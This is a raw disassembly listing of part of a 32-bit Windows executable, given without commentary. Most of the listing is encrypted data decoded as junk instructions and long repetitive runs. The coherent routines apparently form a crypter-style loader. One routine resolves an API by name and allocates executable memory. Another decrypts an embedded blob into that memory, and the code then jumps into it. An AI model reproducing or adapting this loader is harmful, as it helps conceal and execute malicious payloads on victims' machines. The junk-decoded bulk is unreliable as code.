  421344:	xor    ah,BYTE PTR [eax-0xe1bdbce]
  42134a:	loopne 0x4212f5
  42134c:	mov    al,BYTE PTR [edi-0x1016ffa2]
  421352:	adc    edx,DWORD PTR fs:[edx-0x32]
  421356:	mov    ds:0x72c47485,al
  42135b:	inc    edi
  42135c:	jmp    0x3609:0x71dc4ab2
  421363:	pop    ebx
  421364:	xor    BYTE PTR [eax+0x2d94d65d],cl
  42136a:	je     0x4213ce
  42136c:	and    edx,edx
  42136e:	(bad)  
  42136f:	sbb    al,BYTE PTR [ecx]
  421371:	ror    DWORD PTR [eax-0x7cb301c7],1
  421377:	push   cs
  421378:	popf   
  421379:	pop    ss
  42137a:	fs addr16 jle 0x421352
  42137e:	lock sub ebp,DWORD PTR [esi]
  421381:	and    al,0x7c
  421383:	sub    edi,DWORD PTR [edi]
  421385:	push   ebp
  421386:	ja     0x42131f
  421388:	push   edx
  421389:	ss scas al,BYTE PTR es:[edi]
  42138b:	ins    BYTE PTR es:[edi],dx
  42138c:	jne    0x4213b7
  42138e:	out    0x5a,eax
  421390:	pop    edi
  421391:	dec    ebp
  421392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421393:	pop    esi
  421394:	sub    DWORD PTR [eax],0x36e7dc02
  42139a:	mov    bl,0xb
  42139c:	mov    cl,0x7
  42139e:	push   ds
  42139f:	adc    dl,dh
  4213a1:	sbb    ch,0x95
  4213a4:	out    0x13,eax
  4213a6:	xchg   esi,eax
  4213a7:	out    0x0,eax
  4213a9:	jae    0x42135f
  4213ab:	and    esi,edi
  4213ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213ae:	cmp    eax,0xa61fef89
  4213b3:	mov    bl,bl
  4213b5:	ror    DWORD PTR [edi-0x74],0x3e
  4213b9:	icebp  
  4213ba:	mov    ebp,0xa52bd0a0
  4213bf:	xchg   DWORD PTR [ebx+ebx*1+0x536145af],esi
  4213c6:	fwait
  4213c7:	sub    ecx,edi
  4213c9:	xchg   ebx,eax
  4213ca:	fcmovbe st,st(7)
  4213cc:	or     eax,0xbea0df8b
  4213d1:	inc    ebp
  4213d2:	adc    eax,0x67259d0a
  4213d7:	push   ecx
  4213d8:	(bad)  
  4213d9:	call   FWORD PTR [ebx-0x255f6705]
  4213df:	dec    esi
  4213e0:	in     eax,0x83
  4213e2:	out    dx,al
  4213e3:	jmp    0x629ff75a
  4213e8:	iret   
  4213e9:	jb     0x421392
  4213eb:	jge    0x421409
  4213ed:	sahf   
  4213ee:	shl    DWORD PTR [edi+0x12],0x38
  4213f2:	pop    ebx
  4213f3:	push   edx
  4213f4:	dec    esi
  4213f5:	dec    edx
  4213f6:	mov    DWORD PTR [edx],0x63bba059
  4213fc:	in     eax,0xc3
  4213fe:	jg     0x42147e
  421400:	dec    edx
  421401:	dec    eax
  421402:	cmovg  esp,DWORD PTR [edi]
  421405:	push   ebp
  421406:	sbb    edi,DWORD PTR [edi-0xa98be95]
  42140c:	outs   dx,DWORD PTR ds:[esi]
  42140d:	cmp    dl,al
  42140f:	test   eax,0x36e3d812
  421414:	std    
  421415:	ds jo  0x4213f5
  421418:	sbb    BYTE PTR [edi],dh
  42141a:	mov    ebp,db3
  42141d:	sbb    dl,BYTE PTR [eax+0x7f7c308c]
  421423:	or     al,0x23
  421425:	sub    bl,ah
  421427:	mov    edx,0x5af133d8
  42142c:	test   DWORD PTR [edx],ecx
  42142e:	sub    bh,ah
  421430:	repnz mov DWORD PTR [edi+ebp*4-0x66],ebx
  421435:	adc    eax,0x39a29fa
  42143a:	add    eax,0x11db38a9
  42143f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421440:	pop    esp
  421441:	mov    esi,0x61e6c18c
  421446:	pop    ss
  421447:	aam    0x1b
  421449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42144a:	or     ah,BYTE PTR [ebx]
  42144c:	ja     0x421430
  42144e:	ret    
  42144f:	pusha  
  421450:	inc    edx
  421451:	mov    WORD PTR [edx-0x796e2a8e],?
  421457:	adc    ecx,esp
  421459:	jne    0x42142b
  42145b:	test   eax,0x6b6586b3
  421460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421461:	in     al,dx
  421462:	sbb    al,0x26
  421464:	outs   dx,BYTE PTR ds:[esi]
  421465:	push   ecx
  421466:	pop    es
  421467:	dec    ecx
  421468:	mov    dl,0xab
  42146a:	les    ebx,FWORD PTR [edi+0x56]
  42146d:	xchg   esp,eax
  42146e:	shl    BYTE PTR [ebp+eax*8-0xf],cl
  421472:	test   BYTE PTR [eax],dh
  421474:	rcr    esi,0x48
  421477:	test   edx,ebp
  421479:	or     esp,DWORD PTR [ecx-0x70958a02]
  42147f:	shl    edx,cl
  421481:	xor    al,cl
  421483:	repz add ecx,DWORD PTR [ecx+0x2759e4e6]
  42148a:	add    eax,0xe1dea126
  42148f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421490:	stc    
  421491:	inc    esi
  421492:	es call 0xaa39:0x3818a61f
  42149a:	ja     0x42143b
  42149c:	cdq    
  42149d:	jle    0x421433
  42149f:	xchg   BYTE PTR ds:0xa6806b56,dh
  4214a5:	cmp    dl,BYTE PTR [esi-0x4ca8a217]
  4214ab:	into   
  4214ac:	fisub  DWORD PTR [eax+0x32]
  4214af:	cwde   
  4214b0:	in     eax,0x68
  4214b2:	fdiv   st(3),st
  4214b4:	xchg   edx,eax
  4214b5:	sbb    eax,0xa587c1d0
  4214ba:	jae    0x421450
  4214bc:	int3   
  4214bd:	pop    ebp
  4214be:	mov    eax,ds:0x9cd44ec
  4214c3:	fisttp QWORD PTR [ebx-0xc]
  4214c6:	mov    bl,0xaa
  4214c8:	pop    ss
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0xf0b1b203
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0xfa7c0d44
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	jmp    FWORD PTR [ebp+ebx*1-0x2845e814]
  4217ef:	bound  edx,QWORD PTR [edx-0x10ebf4f4]
  4217f5:	sbb    BYTE PTR [esi],bl
  4217f7:	inc    edi
  4217f8:	jl     0x4217a9
  4217fa:	mov    ecx,0x89262d7
  4217ff:	or     edx,DWORD PTR [edi+ebp*4]
  421802:	out    0xe1,eax
  421804:	inc    edi
  421805:	jl     0x42181e
  421807:	mov    ecx,0x89262d7
  42180c:	or     edx,DWORD PTR [edi+ebp*8]
  42180f:	out    0xe1,eax
  421811:	inc    edi
  421812:	jl     0x42182b
  421814:	mov    ecx,0x89262d7
  421819:	or     edx,DWORD PTR [edi+ebp*8]
  42181c:	out    0xe1,eax
  42181e:	inc    edi
  42181f:	jl     0x421838
  421821:	mov    ecx,0xf09262d7
  421826:	or     edx,DWORD PTR [edi+ebp*8]
  421829:	jmp    0x17b5162c
  42182e:	or     eax,0xb0b3afde
  421833:	or     bl,BYTE PTR [eax+0x22]
  421836:	(bad)  
  421837:	mov    ch,0x2f
  421839:	adc    eax,0x10a79964
  42183e:	std    
  42183f:	outs   dx,DWORD PTR ds:[esi]
  421840:	jns    0x4218b7
  421842:	add    bh,0x82
  421845:	adc    bh,BYTE PTR es:[ecx-0x2a]
  421849:	mov    ds:0x2b6df042,eax
  42184e:	call   0x122e:0xc189
  421854:	aaa    
  421855:	std    
  421856:	cwde   
  421857:	xor    DWORD PTR [edx-0x758f9b9b],esi
  42185d:	leave  
  42185e:	in     al,dx
  42185f:	dec    edx
  421860:	jbe    0x421895
  421862:	mov    ecx,0x89262d7
  421867:	or     edx,DWORD PTR [eax+ebp*8]
  42186a:	jle    0x421889
  42186c:	push   ds
  42186d:	aas    
  42186e:	out    dx,eax
  42186f:	sub    ebx,ebp
  421871:	and    DWORD PTR [edx-0x66],ebp
  421874:	add    DWORD PTR [edi+0x17],edx
  421877:	jne    0x421864
  421879:	pop    ds
  42187a:	sbb    DWORD PTR [ebx],ebx
  42187c:	mov    bl,0x88
  42187e:	call   0xedd7:0x71530200
  421885:	and    edi,DWORD PTR [edi-0x4d1ee212]
  42188b:	pop    ebx
  42188c:	cwde   
  42188d:	pusha  
  42188e:	repz xchg ch,ah
  421891:	retf   
  421892:	outs   dx,DWORD PTR ds:[esi]
  421893:	jle    0x42190b
  421895:	push   ecx
  421896:	inc    ecx
  421897:	inc    ebp
  421898:	push   0x1e1a88d8
  42189d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42189e:	pop    ds
  42189f:	jae    0x4218ee
  4218a1:	ss xchg edi,eax
  4218a3:	mov    eax,0x9a6a3add
  4218a8:	add    DWORD PTR [edi+0x17],edx
  4218ab:	je     0x421898
  4218ad:	outs   dx,DWORD PTR ds:[esi]
  4218ae:	test   DWORD PTR [ebp+0x12ba68b3],eax
  4218b4:	add    al,BYTE PTR [esi-0x14]
  4218b7:	jge    0x4218a6
  4218b9:	mov    ecx,0xb11d4122
  4218be:	das    
  4218bf:	lock cwde 
  4218c1:	push   eax
  4218c2:	outs   dx,BYTE PTR ds:[esi]
  4218c3:	sbb    al,0xe5
  4218c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218c6:	sbb    ebp,edx
  4218c8:	jbe    0x421919
  4218ca:	(bad)  
  4218cc:	push   0x1e99f0d0
  4218d1:	mov    ebp,0x3f2f828e
  4218d6:	out    dx,eax
  4218d7:	sub    ebx,ebp
  4218d9:	bound  edx,QWORD PTR [edx-0x10ebf4f8]
  4218df:	out    0xe1,eax
  4218e1:	pop    ss
  4218e2:	cmp    DWORD PTR [edi],edx
  4218e4:	mov    ecx,0x890639b
  4218e9:	stos   DWORD PTR es:[edi],eax
  4218ea:	les    eax,FWORD PTR [eax+ebp*4+0x177c47e1]
  4218f1:	mov    ecx,0xe89262d7
  4218f6:	or     edx,DWORD PTR [edi]
  4218f8:	out    dx,al
  4218f9:	in     al,dx
  4218fa:	loopne 0x421949
  4218fc:	jl     0x421915
  4218fe:	push   edi
  4218ff:	shl    DWORD PTR [edx-0x6e],cl
  421902:	mov    ah,0xd
  421904:	adc    al,0xef
  421906:	out    0xe1,eax
  421908:	inc    edi
  421909:	ins    DWORD PTR es:[edi],dx
  42190a:	stos   BYTE PTR es:[edi],al
  42190b:	mov    ecx,0x88262d7
  421910:	or     edx,DWORD PTR [edi+ebp*8]
  421913:	loop   0x4218f6
  421915:	inc    edi
  421916:	jl     0x42196e
  421918:	mov    ecx,0x89272d7
  42191d:	or     edx,DWORD PTR [esi]
  42191f:	out    dx,eax
  421920:	out    0xe4,eax
  421922:	inc    edi
  421923:	jge    0x42193c
  421925:	mov    ecx,0xd9262d7
  42192a:	or     edx,DWORD PTR ds:0x47e1e7ef
  421930:	jl     0x421949
  421932:	jmp    0xcd47c12
  421937:	or     edx,DWORD PTR [esi+ebp*8]
  42193a:	add    esp,esp
  42193c:	inc    edi
  42193d:	jle    0x421956
  42193f:	mov    ecx,0x18926257
  421944:	or     edx,DWORD PTR [edi+edi*8]
  421947:	out    0xe1,eax
  421949:	inc    edi
  42194a:	jl     0x421953
  42194c:	mov    ecx,0x89272d7
  421951:	or     edx,DWORD PTR [edi+ebp*8]
  421954:	out    0xf1,eax
  421956:	inc    edi
  421957:	jl     0x421970
  421959:	mov    ecx,0x89262d7
  42195e:	or     edx,DWORD PTR [edi+ebp*8]
  421961:	adc    ebx,eax
  421963:	dec    ebx
  421964:	jl     0x4219e4
  421966:	mov    edx,0xf89262d7
  42196b:	add    BYTE PTR [eax+eiz*4],dl
  42196e:	scas   al,BYTE PTR es:[edi]
  42196f:	loope  0x4219b8
  421971:	jl     0x42198a
  421973:	mov    ecx,0x89262d7
  421978:	or     edx,DWORD PTR [edi+ebp*8]
  42197b:	out    0xe1,eax
  42197d:	inc    edi
  42197e:	jl     0x421997
  421980:	mov    ecx,0x89262d7
  421985:	or     edx,DWORD PTR [edi+ebp*8]
  421988:	out    0xe1,eax
  42198a:	inc    edi
  42198b:	jl     0x4219a4
  42198d:	mov    ecx,0x89262d7
  421992:	or     edx,DWORD PTR [edi+ebp*8]
  421995:	out    0xe1,eax
  421997:	inc    edi
  421998:	jl     0x4219b1
  42199a:	mov    ecx,0x89262d7
  42199f:	or     edx,DWORD PTR [edi+ebp*8]
  4219a2:	out    0xe1,eax
  4219a4:	inc    edi
  4219a5:	jl     0x4219be
  4219a7:	mov    ecx,0x89262d7
  4219ac:	or     edx,DWORD PTR [edi+ebp*8]
  4219af:	out    0xe1,eax
  4219b1:	inc    edi
  4219b2:	jl     0x4219cb
  4219b4:	mov    ecx,0x89262d7
  4219b9:	or     edx,DWORD PTR [edi+ebp*8]
  4219bc:	out    0xe1,eax
  4219be:	inc    edi
  4219bf:	jl     0x4219d8
  4219c1:	mov    ecx,0x89262d7
  4219c6:	or     edx,DWORD PTR [edi+ebp*8]
  4219c9:	out    0xe1,eax
  4219cb:	inc    edi
  4219cc:	jl     0x4219e5
  4219ce:	mov    ecx,0x89262d7
  4219d3:	or     edx,DWORD PTR [edi+ebp*8]
  4219d6:	out    0xe1,eax
  4219d8:	inc    edi
  4219d9:	push   edx
  4219da:	arpl   sp,bx
  4219dc:	scas   eax,DWORD PTR es:[edi]
  4219dd:	push   ss
  4219de:	xchg   edx,eax
  4219df:	or     BYTE PTR [ebx],cl
  4219e1:	adc    al,0xf
  4219e3:	in     al,dx
  4219e4:	loope  0x421a2d
  4219e6:	ins    BYTE PTR es:[edi],dx
  4219e7:	pop    ss
  4219e8:	mov    ecx,0x896b6d7
  4219ed:	or     edx,DWORD PTR [eax]
  4219ef:	out    dx,eax
  4219f0:	out    0xb1,eax
  4219f2:	add    bh,BYTE PTR [edi]
  4219f4:	and    eax,0x926298ed
  4219f9:	or     BYTE PTR [ebx],cl
  4219fb:	adc    al,0xef
  4219fd:	(bad)  
  4219fe:	loope  0x421a47
  421a00:	pushf  
  421a01:	cmp    ebx,ecx
  421a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a04:	adc    cl,dh
  421a06:	or     BYTE PTR [ebx],cl
  421a08:	adc    al,0xef
  421a0a:	xchg   ecx,esp
  421a0c:	inc    edi
  421a0d:	jl     0x4219f6
  421a0f:	mov    dl,0xd7
  421a11:	(bad)  
  421a12:	enter  0xb08,0x14
  421a16:	aaa    
  421a17:	jecxz  0x4219fa
  421a19:	inc    edi
  421a1a:	jl     0x421a33
  421a1c:	mov    ecx,0x89262d7
  421a21:	or     edx,DWORD PTR [edi+ebp*8]
  421a24:	out    0xc1,eax
  421a26:	inc    edi
  421a27:	jl     0x421a20
  421a29:	mov    ecx,0x89262d7
  421a2e:	or     edx,DWORD PTR [edi+ebp*8]
  421a31:	out    0xe1,eax
  421a33:	inc    edi
  421a34:	jl     0x421a4d
  421a36:	mov    ecx,0x89262d7
  421a3b:	or     edx,DWORD PTR [edi+ebp*8]
  421a3e:	out    0xe1,eax
  421a40:	inc    edi
  421a41:	jl     0x421a5a
  421a43:	mov    ecx,0x89262d7
  421a48:	or     edx,DWORD PTR [edi+ebp*8]
  421a4b:	out    0xe1,eax
  421a4d:	inc    edi
  421a4e:	jl     0x421a67
  421a50:	mov    ecx,0x89262d7
  421a55:	or     edx,DWORD PTR [edi+ebp*8]
  421a58:	out    0xe1,eax
  421a5a:	inc    edi
  421a5b:	jl     0x421a74
  421a5d:	mov    ecx,0x89262d7
  421a62:	or     edx,DWORD PTR [edi+ebp*8]
  421a65:	out    0xe1,eax
  421a67:	inc    edi
  421a68:	jl     0x421a81
  421a6a:	mov    ecx,0x89262d7
  421a6f:	or     edx,DWORD PTR [edi+ebp*8]
  421a72:	out    0xe1,eax
  421a74:	inc    edi
  421a75:	jl     0x421a8e
  421a77:	mov    ecx,0x89262d7
  421a7c:	or     edx,DWORD PTR [edi+ebp*8]
  421a7f:	out    0xe1,eax
  421a81:	inc    edi
  421a82:	jl     0x421a9b
  421a84:	mov    ecx,0x89262d7
  421a89:	or     edx,DWORD PTR [edi+ebp*8]
  421a8c:	out    0xe1,eax
  421a8e:	inc    edi
  421a8f:	jl     0x421aa8
  421a91:	mov    ecx,0x89262d7
  421a96:	or     edx,DWORD PTR [edi+ebp*8]
  421a99:	out    0xe1,eax
  421a9b:	inc    edi
  421a9c:	jl     0x421ab5
  421a9e:	mov    ecx,0x89262d7
  421aa3:	or     edx,DWORD PTR [edi+ebp*8]
  421aa6:	out    0xe1,eax
  421aa8:	inc    edi
  421aa9:	jl     0x421ac2
  421aab:	mov    ecx,0x89262d7
  421ab0:	or     edx,DWORD PTR [edi+ebp*8]
  421ab3:	out    0xe1,eax
  421ab5:	inc    edi
  421ab6:	jl     0x421acf
  421ab8:	mov    ecx,0x89262d7
  421abd:	or     edx,DWORD PTR [edi+ebp*8]
  421ac0:	out    0xe1,eax
  421ac2:	inc    edi
  421ac3:	jl     0x421adc
  421ac5:	mov    ecx,0x89262d7
  421aca:	or     edx,DWORD PTR [edi+ebp*8]
  421acd:	out    0xe1,eax
  421acf:	inc    edi
  421ad0:	jl     0x421ae9
  421ad2:	mov    ecx,0x89262d7
  421ad7:	or     edx,DWORD PTR [edi+ebp*8]
  421ada:	out    0xe1,eax
  421adc:	inc    edi
  421add:	jl     0x421af6
  421adf:	mov    ecx,0x89262d7
  421ae4:	or     edx,DWORD PTR [edi+ebp*8]
  421ae7:	out    0xe1,eax
  421ae9:	inc    edi
  421aea:	jl     0x421b03
  421aec:	mov    ecx,0x89262d7
  421af1:	or     edx,DWORD PTR [edi+ebp*8]
  421af4:	out    0xe1,eax
  421af6:	inc    edi
  421af7:	jl     0x421b10
  421af9:	mov    ecx,0x89262d7
  421afe:	or     edx,DWORD PTR [edi+ebp*8]
  421b01:	out    0xe1,eax
  421b03:	inc    edi
  421b04:	jl     0x421b1d
  421b06:	mov    ecx,0x89262d7
  421b0b:	or     edx,DWORD PTR [edi+ebp*8]
  421b0e:	out    0xe1,eax
  421b10:	inc    edi
  421b11:	jl     0x421b2a
  421b13:	mov    ecx,0x89262d7
  421b18:	or     edx,DWORD PTR [edi+ebp*8]
  421b1b:	out    0xe1,eax
  421b1d:	inc    edi
  421b1e:	jl     0x421b37
  421b20:	mov    ecx,0x89262d7
  421b25:	or     edx,DWORD PTR [edi+ebp*8]
  421b28:	out    0xe1,eax
  421b2a:	inc    edi
  421b2b:	jl     0x421b44
  421b2d:	mov    ecx,0x89262d7
  421b32:	or     edx,DWORD PTR [edi+ebp*8]
  421b35:	out    0xe1,eax
  421b37:	inc    edi
  421b38:	jl     0x421b51
  421b3a:	mov    ecx,0x89262d7
  421b3f:	or     edx,DWORD PTR [edi+ebp*8]
  421b42:	out    0xe1,eax
  421b44:	inc    edi
  421b45:	jl     0x421b5e
  421b47:	mov    ecx,0x89262d7
  421b4c:	or     edx,DWORD PTR [edi+ebp*8]
  421b4f:	out    0xe1,eax
  421b51:	inc    edi
  421b52:	jl     0x421b6b
  421b54:	mov    ecx,0x89262d7
  421b59:	or     edx,DWORD PTR [edi+ebp*8]
  421b5c:	out    0xe1,eax
  421b5e:	inc    edi
  421b5f:	jl     0x421b78
  421b61:	mov    ecx,0x89262d7
  421b66:	or     edx,DWORD PTR [edi+ebp*8]
  421b69:	out    0xe1,eax
  421b6b:	inc    edi
  421b6c:	jl     0x421b85
  421b6e:	mov    ecx,0x89262d7
  421b73:	or     edx,DWORD PTR [edi+ebp*8]
  421b76:	out    0xe1,eax
  421b78:	inc    edi
  421b79:	jl     0x421b92
  421b7b:	mov    ecx,0x89262d7
  421b80:	or     edx,DWORD PTR [edi+ebp*8]
  421b83:	out    0xe1,eax
  421b85:	inc    edi
  421b86:	jl     0x421b9f
  421b88:	mov    ecx,0x89262d7
  421b8d:	or     edx,DWORD PTR [edi+ebp*8]
  421b90:	out    0xe1,eax
  421b92:	inc    edi
  421b93:	jl     0x421bac
  421b95:	mov    ecx,0x89262d7
  421b9a:	or     edx,DWORD PTR [edi+ebp*8]
